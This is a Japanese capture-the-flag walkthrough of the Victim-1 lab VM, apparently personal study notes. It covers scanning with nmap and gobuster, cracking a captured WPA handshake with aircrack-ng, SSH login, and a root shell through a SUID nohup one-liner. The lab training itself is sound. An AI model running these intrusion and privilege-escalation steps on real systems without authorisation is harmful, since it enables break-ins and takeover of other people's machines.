## 1.Victimー１マシンのIPアドレスを特定する
```bash
$sudo netdiscover -i enp0s3 -r 192.168.56.0/24
```
```
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0b      1      60  Unknown vendor
 192.168.56.100  08:00:27:a7:b4:59      1      60  PCS Systemtechnik GmbH
 192.168.56.108  08:00:27:ac:57:7f      1      60  PCS Systemtechnik GmbH
```

|項目| IP|
|-----|----|
|ターゲット端末（Vivtim-1） | 192.168.56.108|

## 2.Ping で疎通確認する
```bash
sudo ping  192.168.56.108
```
- 応答は帰ってこないがエラーが返ってこないのでPing応答を待ったままになっている

## 3.ポートスキャンする
- Pingの応答はかえってこないため、明示的に省略する
```bash
sudo nmap -p- -Pn -P0 192.168.56.108
```
|オプション|内容|
|----|----|
|-p-|全ポート対称|
|-Pn| スキャン前にPingを送信しない|
|-P0|ホストの存在を調べない|

```
# 結果
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
8999/tcp open  bctp
9000/tcp open  cslistener
MAC Address: 08:00:27:2B:EE:8F (Oracle VirtualBox virtual NIC)
```
## 4.ポート８０のHTTPサービスにアクセスする
<img width="646" height="181" alt="image" src="https://github.com/user-attachments/assets/a5043327-ba4b-4e26-9a93-25eac21c5460" />

## 5.アクセスできるファイルを列挙する
```bash
gobuster dir -u 192.168.56.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html,txt
```
- 結構時間かかる
- 必要なもの以外を省いてる（PHP,HTML,txt以外）
- 怪しいと思うファイルにアクセスしていく　⇒　まずはrobots.txt<br>
<img width="778" height="198" alt="image" src="https://github.com/user-attachments/assets/d3c6833c-bf35-49bb-bc47-8b228c4634e7" />

## 5.ポート８０８０も同様に行う
```bash
gobuster dir -u http://192.168.56.108:8080 -w /usr/share/wordlists/dirbust
er/directory-list-2.3-small.txt -x php,html,tx
```
- passwords.txtを発見したので確認してみる
<img width="751" height="187" alt="image" src="https://github.com/user-attachments/assets/3e69133f-b8a2-4a36-b01f-5eb54d7e21af" />

## 6.ポート８９９９を調べる
<img width="857" height="639" alt="image" src="https://github.com/user-attachments/assets/d485fbc3-7847-46d5-90c2-f7721ec85e57" />
- ファイル名を見る限りWordpressのものと推測できる
- WPA-01.capをコピーして取得する
- 作業用ディレクトリを作成してそこに上記capファイルをダウンロードする
  ```bash
  wget http://192.168.56.108:8999/WPA-01.cap
  ```
-以下でPCAP形式であることがわかる

```bash
lq[user@parrot]q[~/vulnhub/victim]
mqqq $file WPA-01.cap
WPA-01.cap: pcap capture file, microsecond ts (little-endian) - version 2.4 (802.11, capture length 65535)
lq[user@parrot]q[~/vulnhub/victim]
mqqq $capinfos WPA-01.cap
File name:           WPA-01.cap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  IEEE 802.11 Wireless LAN
File timestamp precision:  microseconds (6)
Packet size limit:   file hdr: 65535 bytes
Number of packets:   1,918
File size:           202 kB
Data size:           171 kB
Capture duration:    270.055234 seconds
First packet time:   2020-04-02 22:18:20.879666
Last packet time:    2020-04-02 22:22:50.934900
Data byte rate:      636 bytes/s
Data bit rate:       5,095 bits/s
Average packet size: 89.67 bytes
Average packet rate: 7 packets/s
SHA256:              62f052734ef4795668ec968147069427677bc2f32560bed0c4f25a7159fd22f1
RIPEMD160:           123764b0e0ee65c96303ac7919ea80085c3c10e7
SHA1:                3e1d2cd2d5dafff5fb67bbc43b60445a6260d9c6
Strict time order:   False
Number of interfaces in file: 1
Interface #0 info:
                     Encapsulation = IEEE 802.11 Wireless LAN (20 - ieee-802-11)
                     Capture length = 65535
                     Time precision = microseconds (6)
                     Time ticks per second = 1000000
                     Number of stat entries = 0
                     Number of packets = 1918
```

- 今回はtshark（wiresharkのCUI版）を使う
  
  ```bash
  tshark -r WPA-01.cap -q -z io,phs
  ```
  
  |オプション|概要|
  |---|----|
  |-r|パケットファイルを読み込む|
  |-q|統計情報のみを表示する|
  |-z io,phs|統計情報をプロトコル階層で表示する|

## 7.Wiresharkを使う
- PCAP形式のファイルを指定して開いたら、「統計」＞「プロトコル階層」でtsharkで得た情報と同等の情報が得られる
<img width="1444" height="1001" alt="image" src="https://github.com/user-attachments/assets/6cec7bd0-7b61-47b3-8779-391834150652" />

<img width="812" height="676" alt="image" src="https://github.com/user-attachments/assets/08686230-1e0c-4710-9137-d17a6c345523" />

NO.1のパケットをみるとIEEE802.11b Wireless Management と書かれているため、無線LANのパケットである<br>
中身を確認するとESSIDが「dlink」,暗号化方式がWPAバージョン1であることがわかる

今回はここまでわかればOK　⇒　Wireshark終了

## 8.無線LANのパスワードを解析する
```bash
aircrack-ng WPA-01.cap -w /usr/share/wordlists/rockyou.txt
```
```
♯ 結果

                               Aircrack-ng 1.7

      [00:00:34] 266580/14344392 keys tested (7816.72 k/s)

      Time left: 30 minutes, 0 seconds                           1.86%

                           KEY FOUND! [ p4ssword ]


      Master Key     : D0 0D B3 22 7A 23 D6 5F 83 20 9E 9C E9 90 9D F4
                       D6 E2 7C FC 39 A3 59 80 6B BF 37 67 9C CF C9 AF

      Transient Key  : A9 F8 F1 50 65 96 6A FE 69 C3 BC 7E F7 F2 1C 67
                       2E 95 B3 BF 2F EE CE 2B 72 0B 67 EA B6 04 9C 2D
                       AB 75 7C 28 B7 5B C7 E6 39 5B B3 A4 57 1E 83 77
                       39 B3 A8 18 33 46 A3 8A 4A E2 56 5C E4 36 9B FA

      EAPOL HMAC     : 69 78 9A F4 96 D2 76 CD 1C 80 E8 F9 75 34 29 26
```
- パスワードは「p4ssword」

## 9.得た情報を使ってSSHアクセスする
```bash
sudo ssh dlink@192.168.56.108
```

## 10.sudoの設定を確認する
```bash
sudo -l
```
```
User dlink may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/TryHarder!
```
```
dlink@victim01:~$ ls /usr/bin/TryHarder!
ls: cannot access '/usr/bin/TryHarder!': No such file or directory
# このファイルは存在しない。作者がメッセージを残しただけの可能性がある
```

## 11.SUIDファイルを検索する
```bash
find / -perm -4000 -ls 2> /dev/null
```
```
♯　結果
    11165    376 -rwsr-xr--   1 root     dip        382696 Feb 11  2020 /usr/sbin/pppd
      676     24 -rwsr-xr-x   1 root     root        22520 Mar 27  2019 /usr/bin/pkexec
     1173     40 -rwsr-xr-x   1 root     root        37136 Mar 22  2019 /usr/bin/newuidmap
     2278     76 -rwsr-xr-x   1 root     root        76496 Mar 22  2019 /usr/bin/chfn
     1172     40 -rwsr-xr-x   1 root     root        37136 Mar 22  2019 /usr/bin/newgidmap
      469     40 -rwsr-xr-x   1 root     root        40344 Mar 22  2019 /usr/bin/newgrp
     2226    148 -rwsr-xr-x   1 root     root       149080 Jan 31  2020 /usr/bin/sudo
      950     36 -rwsr-xr-x   1 root     root        35000 Jan 18  2018 /usr/bin/nohup  ←　ここに注目！！
     2279     44 -rwsr-xr-x   1 root     root        44528 Mar 22  2019 /usr/bin/chsh
     2471     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
      690     52 -rwsr-sr-x   1 daemon   daemon      51464 Feb 20  2018 /usr/bin/at
     2282     60 -rwsr-xr-x   1 root     root        59640 Mar 22  2019 /usr/bin/passwd
     2281     76 -rwsr-xr-x   1 root     root        75824 Mar 22  2019 /usr/bin/gpasswd
    10977     24 -rwsr-xr-x   1 root     root        22528 Jun 28  2019 /usr/bin/arping
    11027    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
     6886     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
      702     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
     7602    100 -rwsr-xr-x   1 root     root         100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
     1316     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
      512    108 -rwsr-sr-x   1 root     root         109432 Oct 30  2019 /usr/lib/snapd/snap-confine
   393274     44 -rwsr-xr-x   1 root     root          43088 Mar  5  2020 /bin/mount
   393281     44 -rwsr-xr-x   1 root     root          44664 Mar 22  2019 /bin/su
   393282     28 -rwsr-xr-x   1 root     root          26696 Mar  5  2020 /bin/umount
   393601     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping
   393285     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
```
- nohupコマンドがSUIDであることがわかる
  ```
  # nohupコマンドとは
  　通常、コマンドを実行している最中にTerminalを閉じると実行中のコマンドは終了する。バックグラウンドも同様。
  　これをTerminalを閉じた状態でも継続実行したい時に使う。
  ⇒　今回はこれを悪用します
  ```

- nohupを利用してシェルを起動する
  ```bash
  nohup /bin/sh -p -c "sh -p < $(tty) > $(tty) 2> $(tty)"
  ```
  - プロンプトが返ってくる

## 12.フラグファイルを開く
```bash
# ls
nohup.out
# whoami
root
# pwd
/home/dlink
# cd /rot
sh: 4: cd: can't cd to /rot
# cd /root
# ls
flag.txt  snap
# cat flag.txt
Nice work!

                .:##:::.
              .:::::/;;\:.
        ()::::::@::/;;#;|:.
        ::::##::::|;;##;|::
         ':::::::::\;;;/::'
              ':::::::::::
               |O|O|O|O|O|O
               :#:::::::##::.
              .:###:::::#:::::.
              :::##:::::::::::#:.
               ::::;:::::::::###::.
               ':::;::###::;::#:::::
                ::::;::#::;::::::::::
                :##:;::::::;::::###:::     .
              .:::::; .:::##::::::::::::::::
              ::::::; :::::::::::::::::##::  #rootdance
#
```
